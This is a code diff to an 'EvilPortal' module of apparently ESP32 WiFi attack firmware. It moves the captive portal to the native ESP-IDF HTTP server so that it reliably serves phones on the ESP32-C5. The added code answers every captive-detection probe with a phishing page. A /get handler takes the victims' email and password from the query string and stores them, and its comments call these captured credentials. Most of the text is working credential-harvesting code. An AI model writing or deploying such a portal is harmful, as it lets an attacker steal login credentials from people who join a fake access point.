@@ -23,7 +23,103 @@ bool replacePortalHtml(const char* html, size_t length) {
 }
 }
 
-AsyncWebServer server(80);
+// Native ESP-IDF HTTP server. The ESP32-C5 does not accept connections through
+// AsyncTCP/ESPAsyncWebServer (the phone associates but every request is
+// refused), which is why the captive portal never served. The working v1.16.0
+// V8 firmware uses esp_http_server, so we do too.
+static httpd_handle_t evil_portal_httpd = nullptr;
+
+extern EvilPortal evil_portal_obj;
+
+namespace {
+
+// Minimal application/x-www-form-urlencoded value decoder (%XX and '+').
+String portalUrlDecode(const char* src) {
+  String out;
+  if (src == nullptr) return out;
+  for (size_t i = 0; src[i] != '\0'; i++) {
+    char c = src[i];
+    if (c == '+') {
+      out += ' ';
+    } else if (c == '%' && src[i + 1] && src[i + 2]) {
+      auto hex = [](char h) -> int {
+        if (h >= '0' && h <= '9') return h - '0';
+        if (h >= 'a' && h <= 'f') return h - 'a' + 10;
+        if (h >= 'A' && h <= 'F') return h - 'A' + 10;
+        return -1;
+      };
+      int hi = hex(src[i + 1]), lo = hex(src[i + 2]);
+      if (hi >= 0 && lo >= 0) {
+        out += static_cast<char>((hi << 4) | lo);
+        i += 2;
+      } else {
+        out += c;
+      }
+    } else {
+      out += c;
+    }
+  }
+  return out;
+}
+
+esp_err_t portalSendHtml(httpd_req_t* req) {
+  httpd_resp_set_type(req, "text/html");
+  if (index_html != nullptr)
+    return httpd_resp_send(req, index_html, HTTPD_RESP_USE_STRLEN);
+  return httpd_resp_send(req, "", 0);
+}
+
+// Root + any captive-detection path (served via the 404 fallback) returns the
+// portal HTML, which triggers the client's captive-portal detection.
+esp_err_t portalRootHandler(httpd_req_t* req) {
+  return portalSendHtml(req);
+}
+
+esp_err_t portalCatchAll(httpd_req_t* req, httpd_err_code_t error) {
+  httpd_resp_set_status(req, "200 OK");
+  return portalSendHtml(req);
+}
+
+esp_err_t portalApNameHandler(httpd_req_t* req) {
+  httpd_resp_set_type(req, "text/plain");
+  String ssid = WiFi.softAPSSID();
+  return httpd_resp_send(req, ssid.c_str(), HTTPD_RESP_USE_STRLEN);
+}
+
+// Captured credentials arrive as /get?email=...&password=...
+esp_err_t portalGetHandler(httpd_req_t* req) {
+  size_t qlen = httpd_req_get_url_query_len(req) + 1;
+  if (qlen > 1) {
+    char* query = static_cast<char*>(malloc(qlen));
+    if (query != nullptr) {
+      if (httpd_req_get_url_query_str(req, query, qlen) == ESP_OK) {
+        char value[160];
+        if (httpd_query_key_value(query, "email", value, sizeof(value)) == ESP_OK)
+          evil_portal_obj.onCredentialField(true, portalUrlDecode(value));
+        if (httpd_query_key_value(query, "password", value, sizeof(value)) == ESP_OK)
+          evil_portal_obj.onCredentialField(false, portalUrlDecode(value));
+      }
+      free(query);
+    }
+  }
+  httpd_resp_set_type(req, "text/html");
+  const char* redirect =
+      "<html><head><script>setTimeout(() => { window.location.href='/' }, 100);"
+      "</script></head><body></body></html>";
+  return httpd_resp_send(req, redirect, HTTPD_RESP_USE_STRLEN);
+}
+
+}  // namespace
+
+void EvilPortal::onCredentialField(bool is_email, const String& value) {
+  if (is_email) {
+    this->user_name = value;
+    this->name_received = true;
+  } else {
+    this->password = value;
+    this->password_received = true;
+  }
+}
 
 void EvilPortal::setup() {
   this->runServer = false;
@@ -46,23 +142,22 @@ void EvilPortal::setup() {
 }
 
 void EvilPortal::cleanup() {
-  // Only tear the web server / DNS down if THIS object actually started them.
-  // cleanup() is called from every StopScan, not just Evil Portal's, so an
-  // unconditional teardown ran on unrelated scans too. Crucially we call
-  // server.end() (not just softAPdisconnect): AsyncServer::begin() no-ops when
-  // it still thinks it is listening, so without end() the listener left dangling
-  // after the AP was torn down was never re-armed -> the next activation's
-  // server.begin() did nothing and every request was refused ("connected, no
-  // portal", zero portal requests). end() frees the listening PCB so the next
-  // begin() creates a fresh one. AP/radio teardown is left to
-  // WiFiScan::shutdownWiFi(), which runs right after this (see StopScan).
+  // Only tear the HTTP server / DNS down if THIS object actually started them.
+  // cleanup() is called from every StopScan, not just Evil Portal's, so guard on
+  // runServer to avoid touching network state on unrelated scans. httpd_stop()
+  // here (while lwIP is still up -- StopScan calls cleanup() before
+  // shutdownWiFi()) closes the listening socket so the next activation's
+  // httpd_start() binds cleanly. AP/radio teardown is left to shutdownWiFi().
   const bool portal_was_running = this->runServer;
   this->runServer = false;
   this->ap_index = -1;
 
   if (portal_was_running) {
     this->dnsServer.stop();
-    server.end();
+    if (evil_portal_httpd != nullptr) {
+      httpd_stop(evil_portal_httpd);
+      evil_portal_httpd = nullptr;
+    }
   }
 
   free(index_html);
@@ -93,58 +188,50 @@ String EvilPortal::get_password() {
 }
 
 void EvilPortal::setupServer() {
-  server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
-    this->http_hits++;
-    request->send(200, "text/html", index_html ? index_html : "");
-    #ifndef MARAUDER_V8
-      Serial.println(F("client connected"));
-    #endif
-  });
-
-  const char* captiveEndpoints[] = {
-    "/hotspot-detect.html",
-    "/library/test/success.html",
-    "/success.txt",
-    "/generate_204",
-    "/gen_204",
-    "/ncsi.txt",
-    "/connecttest.txt",
-    "/redirect"
-  };
-
-  for (int i = 0; i < sizeof(captiveEndpoints) / sizeof(captiveEndpoints[0]); i++) {
-    
-    server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request){
-      this->http_hits++;
-      request->send(200, "text/html", index_html ? index_html : "");
-    });
+  // Start (or restart) the native HTTP server on a fresh socket each activation.
+  if (evil_portal_httpd != nullptr) {
+    httpd_stop(evil_portal_httpd);
+    evil_portal_httpd = nullptr;
   }
 
-  server.on("/get-ap-name", HTTP_GET, [this](AsyncWebServerRequest *request) {
-    request->send(200, "text/plain", WiFi.softAPSSID());
-  });
+  httpd_config_t config = HTTPD_DEFAULT_CONFIG();
+  config.server_port = 80;
+  config.ctrl_port = 32768;
+  config.lru_purge_enable = true;
+  config.max_uri_handlers = 8;
+  config.stack_size = 8192;
 
-  server.on("/get", HTTP_GET, [this](AsyncWebServerRequest *request) {
-    String inputMessage;
-    String inputParam;
+  if (httpd_start(&evil_portal_httpd, &config) != ESP_OK) {
+    evil_portal_httpd = nullptr;
+    #ifndef MARAUDER_V8
+      Serial.println(F("Evil Portal: httpd_start failed"));
+    #endif
+    return;
+  }
 
-    if (request->hasParam("email")) {
-      inputMessage = request->getParam("email")->value();
-      inputParam = "email";
-      this->user_name = inputMessage;
-      this->name_received = true;
-    }
+  httpd_uri_t root_uri = {};
+  root_uri.uri = "/";
+  root_uri.method = HTTP_GET;
+  root_uri.handler = portalRootHandler;
+  httpd_register_uri_handler(evil_portal_httpd, &root_uri);
 
-    if (request->hasParam("password")) {
-      inputMessage = request->getParam("password")->value();
-      inputParam = "password";
-      this->password = inputMessage;
-      this->password_received = true;
-    }
-    request->send(
-      200, "text/html",
-      "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>");
-  });
+  httpd_uri_t get_uri = {};
+  get_uri.uri = "/get";
+  get_uri.method = HTTP_GET;
+  get_uri.handler = portalGetHandler;
+  httpd_register_uri_handler(evil_portal_httpd, &get_uri);
+
+  httpd_uri_t apname_uri = {};
+  apname_uri.uri = "/get-ap-name";
+  apname_uri.method = HTTP_GET;
+  apname_uri.handler = portalApNameHandler;
+  httpd_register_uri_handler(evil_portal_httpd, &apname_uri);
+
+  // Every other path (the OS captive-detection probes: /generate_204,
+  // /hotspot-detect.html, /ncsi.txt, ...) is unregistered and so lands on the
+  // 404 handler, which answers 200 + the portal HTML. That mismatch is what
+  // makes the phone pop the "Sign in" page.
+  httpd_register_err_handler(evil_portal_httpd, HTTPD_404_NOT_FOUND, portalCatchAll);
 }
 
 void EvilPortal::setHtmlFromSerial() {
@@ -355,20 +442,10 @@ void EvilPortal::startAP() {
     Serial.println(WiFi.softAPIP());
   #endif
 
-  // Register the web-server endpoints + captive handler ONCE (addHandler leaks a
-  // CaptiveRequestHandler per call and server.on() appends duplicate handlers),
-  // but call server.begin() on EVERY activation. This matches Marauder Eternal
-  // and fixes the core serving bug: our cleanup() tears the AP down between
-  // runs, which kills the listening socket, so a begin() that only ran once left
-  // the web server dead -> the phone connected but every request was refused
-  // (portal reqs stayed 0). Re-begin()'ing re-arms the listener each time.
-  static bool s_server_registered = false;
-  if (!s_server_registered) {
-    this->setupServer();
-    server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
-    s_server_registered = true;
-  }
-  server.begin();
+  // Start the native HTTP server fresh on the just-created AP. (Done every
+  // activation because cleanup() stops it; esp_http_server binds its own socket
+  // so this reliably accepts connections on the ESP32-C5, unlike AsyncTCP.)
+  this->setupServer();
 
   this->dnsServer.start(53, "*", WiFi.softAPIP());
   #ifndef MARAUDER_V8
